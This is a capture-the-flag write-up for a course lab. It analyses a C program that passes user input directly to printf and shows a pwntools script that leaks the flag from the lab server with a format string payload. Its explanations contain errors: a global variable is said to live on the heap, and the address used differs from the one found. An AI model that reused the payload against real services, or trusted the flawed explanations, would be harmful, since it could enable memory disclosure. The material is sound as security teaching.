# Format Strings

##First Flag

###File Analysis

As good practice, we start off by investigating what we're being given. Therefore we be analysing what's inside "_main.c_":

Looking inside the code we can see that it:

-Creates an array "_flag_" accessibable throughout the file whose size is given with _FLAG_BUFFER_SIZE_, which is 40.

```C
#define FLAG_BUFFER_SIZE 40 

char flag[FLAG_BUFFER_SIZE]; // file size is 40!
```

- Stores the _flag.txt_ content inside of the flag array.

```C
FILE *fd = fopen("flag.txt","r");

if(fd != NULL) {
    fgets(flag, FLAG_BUFFER_SIZE, fd);
}```

-Reads 32 bytes of _user input_, stores inside of the character array _buffer_ and then prints it.

```C

        char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%32s", &buffer);
    printf("You gave me this: ");
    printf(buffer);
```
-An _if_ statement that executes different messages in case we achieved in getting the flag or not.

```C
if(0) {
    printf("I like what you got!\n%s\n", flag);
} else {
    printf("\nDisqualified!\n");
}
```
###Execution Analysis

We will now be analysing how _main.c_ behaviour works on _program_ (which is _main.c_ compilled) with the command:

```bash
checksec --file=program
```
![Alt text](./images/ctf7-1.png)

We can see here that here that the binaries aren't randomize(is not a _PIE_, Position-Independent Executable), but there are canaries, which prevents buffer overflow attacks as they will be detected

Using that knowlegde, we can assume that we are going to use a _format string attack_ as we have a _printf_ that prints an input stored in a 32 byte buffer. 

When we run the program, whenever the function _load___flag_ it will put the flag into the the buffer which, as a global variable, will be stored in the heap. Using _dbg_ we can find out the memory address where the function return address. We will run in the console 
```Bash
gdb program
p load_flag # ```

![Alt text](./images/ctf7-2.png)

So we now know that the return address is **_0x8049256_**.

We will now prepare the payload by making some changes to the given __exploit_example.py__.

```python3
from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4004)

address = 0x804c060 # the address of "flag"
payload = address.to_bytes(4, byteorder='little') + b"%s" //transforms it into a string format

p.recvuntil(b"got:")
p.sendline(payload)
p.interactive()
```

![Alt text](./images/ctf7-3.png)

Thus, the flag we get is **flag{a36ac6c2b6ecee59b102cf406c2e354d}**!


